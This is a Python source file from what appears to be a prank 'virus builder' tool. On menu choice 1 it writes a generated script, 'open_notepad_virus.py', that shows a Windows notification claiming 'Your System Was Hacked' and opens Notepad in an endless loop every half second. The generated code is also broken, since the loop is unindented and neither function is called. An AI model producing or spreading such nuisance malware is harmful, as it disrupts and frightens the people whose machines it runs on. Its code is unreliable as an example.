import sys
import banner
from colorama import Fore

def create():
    banner.banner()
    print('\n'+Fore.RED+"  [*]Welcome To Funny Virus!")
    banner.infolist3()
    try:
        i = input(Fore.LIGHTWHITE_EX+"--> ")
    except KeyboardInterrupt:
        print("")
        sys.exit()

    if int(i) == 1:
        path = ('''
# -*- coding: UTF-8 -*-
#Coded By Jacky
from subprocess import Popen
import time
from win10toast import ToastNotifier
def sayhack():
    toaster = ToastNotifier()
    toaster.show_toast("Funny Virus HAHAHA","Your System Was Hacked. Enjoy :)...")

def open_note():
while True:
    Popen(["notepad.exe"])
    time.sleep(0.5)
    ''')
        
    f = open("../modules/funnyvirus/open_notepad_virus.py","w")
    f.write(path)
    f.close()
    print(Fore.RED+"Your Virus Was Save In FunnyVirus Folder. Check It...")